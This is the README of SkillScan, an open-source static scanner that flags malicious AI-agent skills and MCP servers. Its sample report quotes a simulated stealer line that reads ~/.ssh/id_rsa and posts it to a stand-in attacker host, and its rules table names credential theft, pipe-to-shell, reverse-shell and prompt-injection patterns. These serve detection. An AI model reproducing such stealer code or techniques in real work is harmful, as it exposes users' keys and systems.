# SkillScan

Scan an AI-agent skill or MCP server before you install it.

AI-agent skills and MCP servers run on your machine, with your agent's
permissions — your files, your accounts, your keys. SkillScan reads a
skill folder *before* you install it and gives you one plain-English
verdict — **BLOCK**, **CAUTION**, or **PASS** — from deterministic rules.
No LLM decides the verdict: the same folder always gets the same answer,
and every finding points at the exact rule, file, and line.

SkillScan is free and open source (MIT). There is no hosted tier and no
paid version — the whole tool lives in this repository.

## Example

```console
$ python3 -m skillscan samples/bad/ssh-stealer

SkillScan report for: .../samples/bad/ssh-stealer

Scanned 2 file(s); skipped 0.

Findings (5):
  [CAUTION] HOME_OR_SYSTEM_WRITE — steal.py:12
      Resolves or touches paths in the home directory or system locations (Path.home, expanduser, $HOME, /etc, /usr/local) instead of staying inside its own skill folder.
      > key_path = Path.home() / ".ssh" / "id_rsa"
  [BLOCK] SSH_CREDENTIAL_READ — steal.py:12 (x2)
      Reads SSH credential material (~/.ssh / private key files). A skill
      has no legitimate reason to read your SSH keys.
      > key_path = Path.home() / ".ssh" / "id_rsa"
  [BLOCK] EXFIL_COMBINATION — steal.py:14
      This skill both reads credential / private material AND has a way to
      send data out over the network. That combination is the exfiltration
      shape, whatever either half claims to be for.
  [CAUTION] NETWORK_ACCESS — steal.py:14
      Makes network requests. Network access is common in honest skills, but it is also the channel used to send your data away — check where it talks to.
      > requests.post("https://evil.example.invalid/collect", data=key_text)
  [BLOCK] NETWORK_SEND_DATA — steal.py:14 (x2)
      Sends data out over the network (HTTP POST/PUT, curl -d, a Request with a body). Combined with any local file access this is the classic exfiltration shape.
      > requests.post("https://evil.example.invalid/collect", data=key_text)

VERDICT: BLOCK
```

(That sample is a simulated stealer used only for testing — see
"Test corpus" below. It is never executed, only scanned.)

## Install / usage

Pure Python 3 standard library. No `pip install`, no dependencies.

```bash
git clone https://github.com/RakTikoo/skillscan
cd skillscan

python3 -m skillscan <path-to-skill-folder>              # text report
python3 -m skillscan <path-to-skill-folder> --format md   # Markdown report
python3 -m skillscan <path-to-skill-folder> --format json # machine-readable
python3 -m skillscan <path-to-skill-folder> --format sarif # SARIF 2.1.0 (toolchains)
python3 -m skillscan https://github.com/<owner>/<repo>   # clone + scan a repo
python3 skillscan.py <path-to-skill-folder>               # shim, same thing
```

Repo URLs: only `https://github.com/<owner>/<repo>` is accepted.
SkillScan shallow-clones it into a temp dir (redirect-following
disabled), scans, and deletes the clone. Requires `git` on `PATH`.
npm package folders (`package.json`) and Python package folders
(`setup.py` / `pyproject.toml`) scan like any other folder, with
extra install-time checks (see the rules table).

How scanning works:

- SkillScan walks the folder (pruning `.git`, `__pycache__`, `node_modules`,
  venvs; symlinks are **not** followed) and scans **every regular file that
  decodes as text**, whatever its extension — `.py`, `.sh`, `.ps1`, `.js`,
  extensionless scripts, all of it. UTF-16/UTF-32 files are decoded via
  their BOM instead of being skipped as "binary".
- Python files are also parsed with `ast`, with **constant folding**
  (`"id_" + "rsa"`, f-strings, `chr()` codes, `"".join(...)`, simple
  variable propagation, `Path.home() / ".s" + "sh"` joins) and
  **import-alias resolution** (`import requests as rq`, `getattr`,
  `importlib.import_module`), so splitting strings or renaming imports
  does not hide behaviour.
- Shell scripts get simple variable expansion (`K="$HOME/.ssh/id_rsa"`)
  before rules run; JS gets string-concat squeezing and `fetch` POST
  detection; JSON / MCP manifests are parsed structurally (tools that
  declare arbitrary command execution or unconstrained file reads are
  flagged as manifest findings, not text coincidences).
- Documentation (`.md`, `.txt`, `.yaml`, …) is treated as documentation:
  findings there are capped at CAUTION, and lines that *warn against* a
  pattern ("never reads `~/.ssh`") are recognised as safety documentation,
  not behaviour. Cursor rules (`.cursorrules`, `.cursor/rules/*.mdc`) and
  other agent config/instruction files get the same documentation
  treatment.
- Findings are aggregated per rule per file, with a count.
- Scanned code is **never executed** — files are only read and parsed.

**Coverage is reported, not hidden.** Every report states how many files
were scanned and which were skipped (unreadable, over the 2 MB cap,
special files like FIFOs, symlinks, binary-looking content). If anything
suspicious was skipped — or nothing was scanned at all — the verdict
cannot be a clean PASS (`SCAN_INCOMPLETE`).

### Exit codes

| Exit code | Verdict  | Meaning                                            |
|-----------|----------|----------------------------------------------------|
| 0         | PASS     | No known-bad patterns were found in what was scanned. |
| 1         | CAUTION  | Something worth a human read before installing.    |
| 2         | BLOCK    | At least one block-severity pattern was found.     |
| 3         | —        | Usage / IO error: the scanner could not run (bad path, bad flags). Deliberately distinct from BLOCK. |

The exit codes make SkillScan usable as a CI / install-time gate.

## Toolchain integration

See [`docs/TOOLCHAIN.md`](docs/TOOLCHAIN.md) for the full guide:

- **GitHub Action** — the composite action in [`action.yml`](action.yml)
  (`path`, `fail-on-block`, `format`, `python-version` inputs;
  `verdict` / `exit-code` outputs) runs SkillScan in CI.
- **SARIF** — `--format sarif` emits SARIF 2.1.0 for GitHub code
  scanning, IDEs, and other static-analysis tooling.
- **Pre-install hook** — [`hooks/pre-install-scan.sh`](hooks/pre-install-scan.sh)
  scans a folder before install and exits with the scanner's code, so
  installer wrappers can gate on it.

## Rules

41 deterministic rules. Any block-severity hit makes the verdict BLOCK;
otherwise any caution hit makes it CAUTION; otherwise PASS. Every rule
also carries an OWASP mapping (LLM Top 10 / MCP Top 10 category codes),
surfaced per finding in JSON output and in SARIF rule metadata — it is
triage metadata only and never affects the verdict.

| Rule | Severity | What it catches |
|------|----------|-----------------|
| SSH_CREDENTIAL_READ | block | Reads `~/.ssh`, `id_rsa`, `id_ed25519`, other private-key files |
| CLOUD_CREDENTIAL_READ | block | Reads `~/.aws`, `~/.azure`, `~/.gcloud` credential material |
| ENV_FILE_READ | block | Reads a `.env` file / loads dotenv (JS `process.env` is *not* this rule) |
| ENVIRON_SECRET_ACCESS | caution | Accesses `os.environ` / `getenv(...)` / `process.env` |
| NETWORK_ACCESS | caution | Makes network requests (`requests`, `urllib`, `httpx`, `fetch`, sockets) |
| NETWORK_SEND_DATA | block | Sends data out (HTTP POST/PUT, GET with params/data, `curl -d`, `Request` with a body, socket send) |
| EXFIL_COMBINATION | block | Skill reads credential material **and** has a network send channel |
| SHELL_SUBPROCESS | caution | Runs programs via `subprocess` / `child_process` |
| SHELL_OS_SYSTEM | block | Runs shell strings via `os.system` / `os.popen` |
| EVAL_EXEC | block | `eval(...)` / `exec(...)` / `__import__(...)` of dynamic code |
| BASE64_OBFUSCATION | caution | Decodes base64 / encoded blobs |
| DECODE_AND_RUN | block | Decodes an encoded payload *and* executes dynamic code in the same file |
| CURL_PIPE_BASH | block | `curl ... \| bash` / `wget ... \| sh` download-and-run |
| FILE_DELETE | caution | Deletes files (`os.remove`, `os.unlink`, `shutil.rmtree`) |
| RM_RF | block | `rm -rf` recursive forced deletion (in code; in docs it is a caution) |
| PERSISTENCE | block | Crontab, `.bashrc`, LaunchAgents, systemd, autostart entries (in code; in docs it is a caution) |
| HOME_OR_SYSTEM_WRITE | caution | Resolves/touches home or system paths (`Path.home()`, `expanduser`, `$HOME`, `/etc/`, `getpwuid`, `os.homedir()`) |
| CHMOD_CHOWN | caution | Changes permissions/ownership (`chmod`, `chown`, `os.chmod`) |
| RUNTIME_PACKAGE_INSTALL | caution | Installs packages at run time (`pip install`, `npm install`, `apt-get install`, …) |
| DYNAMIC_IMPORT | caution | `importlib.import_module` that static review cannot resolve |
| CREDENTIAL_ENUMERATION | caution | Glob/walk patterns that look like credential discovery (`id_*`, `.ssh*`) |
| MCP_UNRESTRICTED_EXEC | block | MCP manifest tool that runs arbitrary caller-supplied commands with no constraint |
| MCP_UNRESTRICTED_READ | caution | MCP manifest tool that reads arbitrary files by unconstrained path |
| MCP_SERVER_COMMAND | caution | MCP manifest that starts its server via a shell/interpreter/package-runner command |
| HARDCODED_SECRET_LIVE | block | A credential in an unambiguous live format in the code: AWS key id (`AKIA…`), GitHub token (`ghp_…`, `github_pat_…`), `sk-` API key, Slack token, or a private-key block (placeholders and marked documentation examples are not flagged) |
| HARDCODED_SECRET_GENERIC | caution | A long, high-entropy literal assigned to a password/secret/token variable (env-var references and obvious placeholders are not flagged) |
| CLOUD_METADATA_ACCESS | caution | References a cloud metadata endpoint (`169.254.169.254`, `169.254.170.2`, `metadata.google.internal`, `/latest/meta-data/`) — a source of live cloud credentials |
| CLOUD_METADATA_EXFIL | block | Touches a cloud metadata endpoint **and** reads credential material or has a network send channel |
| BROWSER_CREDENTIAL_STORE | caution | Touches browser/wallet credential storage (`Login Data`, `logins.json`, `key4.db`, `Local State`, browser profile dirs, wallet extension storage); counts as credential material for EXFIL_COMBINATION |
| REVERSE_SHELL | block | A raw socket wired to a shell (`dup2` of the socket fd, `pty.spawn`, `/dev/tcp`, or spawning `/bin/sh` alongside a socket) |
| ERROR_INFO_LEAK | caution | Returns raw exception text, a stack trace, or an environment dump as a tool result (logging the error and returning a plain message is not flagged) |
| PACKAGE_INSTALL_SCRIPT | caution | Package runs code at install time: an npm lifecycle script (`preinstall`/`install`/`postinstall`/`prepare`) or a `setup.py` that reaches for subprocess/network/sockets |
| PACKAGE_INSTALL_SCRIPT_EXEC | block | An install-time script downloads or executes outside code (curl/wget, pipe-to-shell, encoded payload, remote fetch) |
| HIDDEN_TEXT | block / caution | Concealed text: zero-width or bidirectional control characters, Unicode Tags-block payloads (BLOCK when the decoded payload contains instruction keywords), or HTML comments carrying instruction-like content. A single zero-width joiner in ordinary multilingual text does not fire |
| NON_ENGLISH_INSTRUCTION | caution | Instruction-attack phrases in 14 other languages (override / send-the-credentials / keep-it-from-the-user shapes) — a phrase list, not language understanding. The lists are data files (`skillscan/phrases/<code>.json`): adding a language = adding one file |
| ANY_LANGUAGE_STRUCTURE | caution | An instruction surface in ANY language pairs a private credential store (`~/.ssh`, `~/.aws`, a `.env` file, a browser credential store) with an outbound destination (URL, IP, email, curl/wget, webhook). Normal integration guides (your own token → the service's API URL) and safety warnings do not fire |
| MARKDOWN_CONCEALMENT | caution | Content hidden from a rendered view (display:none, visibility:hidden, white-on-white, off-screen positioning, hidden attribute) that contains instruction-grade wording. A plain `<details>` disclosure block does not fire on its own |
| SUBSTITUTION_EXEC | block / caution | Executes a download via shell substitution: `$(curl …)`, backtick curl/wget, `<(curl …)` (BLOCK). A substitution that only captures the download into a variable that is never executed — e.g. a Makefile `$(shell …)` assignment — is CAUTION |
| ENV_INJECTION | caution | Touches `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PYTHONSTARTUP`, or writes a fixed-name file under `/tmp` and makes it executable or runs it |
| ENV_INJECTION_INSTALL | block | An install-time or server-start context (npm lifecycle script, `setup.py`, MCP manifest env, a `.pth` startup file) sets `LD_PRELOAD` / `DYLD_INSERT_LIBRARIES` / `PYTHONSTARTUP` / (install contexts) `PYTHONPATH`, or a `.pth` file carries an `import` line |
| SCAN_INCOMPLETE | caution | Some content could not be scanned, or nothing was scanned — the verdict is partial. Includes compiled code with no inspectable source: a `.pyc` with no matching `.py`, or a native binary in a folder with no source at all |

Every rule ships with a plain-English reason in the report, so a
non-specialist can understand *why* something was flagged.

## What this is not

SkillScan is a **linter, not a guarantee of safety**.

- A **PASS** means "no known-bad patterns were found in the files that
  were scanned" — not "this skill is safe".
- A **BLOCK** means a pattern strongly associated with malicious skills
  was found — read the finding before judging; context matters.
- SkillScan does not run the skill, does not sandbox anything, and does
  not replace reading the code of anything you install with broad
  permissions.

### Known limits (kept honest, from adversarial review)

SkillScan v0 was reviewed by three independent adversarial reviewers
(red-team evasion, false-positive hunting, code/scope audit). The first
version failed badly — 0 of 17 evasion mutations got a BLOCK, and benign
skills were BLOCKed by their own safety documentation. Those defects
were fixed (see the test suites below). What **still** evades or
challenges it, by design of static analysis:

- **Runtime behaviour is invisible.** Code that decides what to do from
  a server response, the date, or an encrypted config can look clean.
- **Strong encryption / packing** of a payload (beyond base64/hex) is
  flagged at most as obfuscation, not decoded.
- **JS/TS is regex + string-squeezing, not a full AST** — deeply dynamic
  JS (computed property access, `eval` of assembled strings via indirect
  routes) can still slip through.
- **Multi-file dataflow** is shallow: a credential read in one file and
  a send in another are combined at skill level (`EXFIL_COMBINATION`),
  but value-level taint tracking across files is not done.
- **CAUTION is noisy by design** for capability flags: a backup tool
  *should* be flagged for subprocess + deletion, a weather skill for
  network + an env API key. `expanduser()` on a user-supplied path is
  currently flagged as home access — a known over-broad caution.
- **Secret detection is heuristic.** The live-format tier needs the
  complete token in one place; the generic tier's regex floor is an
  8-character value, but its entropy requirement (≥3.5 bits per
  character over at least 6 distinct characters) puts the *effective*
  minimum at roughly 12 characters — so short, weak, split or encoded
  secrets evade it, and a random-looking *test* value can trip the
  CAUTION tier. Live-format values in test files or next to FAKE_ /
  FIXTURE markers are downgraded to CAUTION, not blocked. Placeholders
  and marked examples are suppressed, but suppression is substring-based.
- **Metadata / reverse-shell rules are shape-based.** A metadata
  endpoint reached through a resolved hostname or non-standard path, or
  a socket shell wired in an unusual way, can evade them.
- **MCP coverage is structural for common manifest shapes** (`tools[]`,
  `mcpServers`) — exotic manifest layouts may only get text-level rules.
- **Scan budgets are finite.** A scan stops after 2,000 files or 32 MB
  of content (per-file cap 2 MB), and lines are matched after truncation
  at 100,000 characters. Hitting a budget is reported as a suspicious
  skip and forces `SCAN_INCOMPLETE`, so a huge folder degrades to
  CAUTION — never to a silent PASS and never to a hang.
- **Concealment and phrase checks are mechanics, not meaning.**
  `HIDDEN_TEXT` / `MARKDOWN_CONCEALMENT` detect invisible characters
  and hidden elements; `NON_ENGLISH_INSTRUCTION` matches a fixed
  phrase list in 14 languages. None of them understands what prose
  *means*: a novel phrasing, an uncovered language, or a purely
  semantic deception still passes — see the coverage map's Gap B.
  Ordinary multilingual text is deliberately protected (single
  zero-width joiners in Persian/Indic/emoji contexts do not fire), so
  the trade is recall, not false alarms on real-world text.

### Scanner hardening

SkillScan reads untrusted folders, so the scanner itself is treated as
an attack surface (`run_security_tests.py` covers this): symlinks are
never followed, special files (FIFOs, sockets) are skipped rather than
opened, archives are **never extracted**, and a hostile folder cannot
crash the CLI into a traceback — scan failures exit with code 3.
Text and Markdown reports escape control characters from scanned file
names and content, so a malicious folder cannot inject ANSI escapes or
forge report lines in your terminal (JSON output is escaped by its
encoding). To report a vulnerability in SkillScan itself, see
[SECURITY.md](SECURITY.md) — please use GitHub's private vulnerability
reporting, not a public issue.

## Test corpus

`samples/` and `samples-mutations/` contain simulated skills that exist
**only to be scanned — never run them**. Every sample in v0.1 is
**simulated or mutation-based**, written for this project. **Audit-derived
sample files are not included in v0.1** — instead of recreating real
attack samples, [`docs/AUDIT_COVERAGE.md`](docs/AUDIT_COVERAGE.md) maps
the techniques from published audits to the rules below and states,
technique by technique, what is covered and what is not.

| Corpus | Contents | Expected |
|--------|----------|----------|
| `samples/good/` (2) | Benign skills reading files in their own folder | PASS (exit 0) |
| `samples/bad/` (2) | SSH-key stealer; base64 dropper + `curl \| bash` | BLOCK (exit 2) |
| `samples/caution/` (1) | Legit-sounding backup skill using `subprocess` + file deletion | CAUTION (exit 1) |
| `samples-mutations/` (17) | The stealer/dropper/manifest rewritten with evasion techniques: string concatenation, pathlib joins, `importlib`/`getattr`, alias imports, `chr()` codes, chunked base64, JS `fetch`, shell variables, glob discovery, GET-param exfil, PowerShell payload, UTF-16 encoding, unrestricted MCP manifest | BLOCK (exit 2), every one |

Run the suites with:

```bash
python3 run_tests.py           # shipped samples
python3 run_mutation_tests.py  # 17 evasion mutations — all must BLOCK
python3 run_edge_tests.py      # FIFO hang, oversize, empty, usage codes, UTF-16
python3 run_security_tests.py  # hostile folders vs the scanner itself (see below)
python3 run_v02_tests.py       # v0.2: secrets, metadata, browser stores, reverse shells, error leaks, npm/PyPI targets, Cursor rules, repo URLs, SARIF, Action + hook (fixtures are inert and built in a temp dir)
python3 run_v03_tests.py       # v0.3: hidden text (zero-width/Tags/BiDi/comments), non-English instruction phrases, Markdown concealment, substitution exec, session sends, bytecode honesty, env injection, OWASP metadata (fixtures are inert and built in a temp dir)
```

## Coverage against published audits

[`docs/AUDIT_COVERAGE.md`](docs/AUDIT_COVERAGE.md) maps 25 techniques
from four published audits of real malicious skills / MCP servers
against the 41 rules above. Summary (Covered / Partial / Gap per audit):

| Audit | Covered | Partial | Gap |
|-------|---------|---------|-----|
| Snyk — ToxicSkills, Feb 2026 (3,984 skills scanned) | 3 | 5 | 3 |
| Koi Security — ClawHavoc, Feb 2026 (341 malicious skills) | 1 | 4 | 2 |
| Invariant Labs — MCP Tool Poisoning, Apr 2025 | 0 | 2 | 2 |
| Koi Security — postmark-mcp backdoor, Sep 2025 | 0 | 2 | 1 |
| **Total (25 techniques)** | **4** | **13** | **8** |

The honest pattern: SkillScan is strong on the *code-shaped* half of
these audits (credential reads, network exfiltration, decode-and-run
droppers) and weak on the *language-shaped* half (deceptive instructions
in prose or MCP tool descriptions, rug pulls, registry-level tricks) —
several of which no static folder scanner can see. The map gives the
per-technique reasoning and the test-suite evidence (or the lack of it)
for every cell. Read it before trusting a PASS.

Each suite scans samples as subprocesses, asserts verdicts and exit
codes, and exits non-zero on any failure.

## Licence

MIT — see [LICENSE](LICENSE). Copyright (c) 2026 RakTikoo.

## Status

v0.3. v0.1 was a Week 1 spike hardened by adversarial review; v0.2 adds
secret detection, cloud-metadata and browser-store rules, raw-socket
reverse-shell detection, error-leak detection, npm/PyPI package
targets, Cursor-rules handling, repo-URL scanning, SARIF output, and
toolchain integration (GitHub Action + pre-install hook). v0.3 adds
concealment mechanics (zero-width / Unicode Tags / BiDi characters,
instruction-carrying HTML comments, Markdown hiding places),
non-English instruction phrases in 14 languages, shell-substitution
execution, sends through session/client objects, compiled-code
coverage honesty (bytecode or native binaries with no inspectable
source can no longer read as clean), environment-injection shapes
(LD_PRELOAD and friends, predictable temp files), and OWASP mapping
metadata on every rule. Expect false
positives and false negatives; the rule set and corpus are the starting
point, not the finished product. Issues and new evasion samples are
welcome — a mutation that evades SkillScan is a valuable contribution.
